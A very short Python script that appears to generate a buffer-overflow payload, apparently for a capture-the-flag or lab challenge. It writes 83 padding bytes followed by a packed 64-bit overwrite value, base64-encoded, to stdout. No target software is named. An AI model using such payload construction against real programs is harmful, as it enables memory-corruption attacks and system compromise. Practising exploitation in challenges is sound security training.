
import sys
import struct
import base64

buf = b'HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH'
buf += struct.pack('<Q', 11285345005863414139)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
